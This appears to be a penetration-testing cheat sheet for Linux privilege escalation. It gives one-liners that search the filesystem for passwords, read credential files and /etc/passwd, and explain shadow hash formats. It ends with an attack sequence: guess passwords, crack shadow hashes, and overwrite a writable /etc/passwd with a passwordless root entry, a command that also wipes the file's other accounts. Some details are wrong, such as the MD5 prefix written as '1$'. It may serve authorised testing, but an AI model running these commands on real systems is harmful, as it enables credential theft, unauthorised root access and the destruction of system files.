# User and Password One-Liners

## Files With "passw" String 
```
find / -type f -readable -size +0 2>/dev/null | grep -Hi passw 
grep -r -l -i -I passw /  
```

## Plaintext Usernames or Passwords? 
```
grep -i user [filename] 
grep -i pass [filename] 
grep -C 5 "password" [filename] 
```
- For Joomla
```
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password" 
```

## Files Generally With Plaintext / Easily-Reversible Passwords
```
less /var/apache2/* 
cat /root/anaconda-ks.cfg 
strings /var/lib/mysql/mysql/user.MYD 
cat /root/anaconda-ks.cfg 
```
## Users With No Password Set 
```
cut -f1-2 -d':' /etc/passwd | grep -v ':x$' 
```

## Super Users 
```
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' 
awk -F: '($3 == "0") {print}' /etc/passwd
```

# User and Password Hashes

## Background
- /etc/passwd contains users of the machine. If we filter for just the users that have /bin/bash or /bin/sh as their default program upon login, then we can get a list of interactive machine users.
```
Cat /etc/passwd | grep /bin/bash 
Cat /etc/passwd | grep /bin/sh 
grep -vE "nologin" /etc/passwd 
```
- /etc/shadow has the password hashes and is only readable by root unless it's misconfigured to allow other users to read it.
### Hash Syntax 
  - First 3 chatcyers identify the algorithm used.  
  ```
  1$	      MD5 
  $2a$	    Blowfish 
  $2y$	    Blowfish 
  $5$	      SHA-256 
  $6$	      SHA-512 
  ```
  - The next characters are the salt which preceded the next $. 
  - The string after the middle $ is the password hash value.

## Attack Vector
1. Try easy passwords for trying to su to other interactive users.  
2. Display the permissions of the shadow file to see if we or a non-root user can display the hash contents.  Then crack the hash. 
3. Display the permissions of the /etc/ passwd file. If it is writable by the current user then you can overwrite the file to add a new root user without a password required.  
```
echo root::0:0:root:/root:/bin/bash > /etc/passwd 
```
  - Usually there's an X after the username to signify a password is required. When it is omitted (like this example), you can su to root without a password.
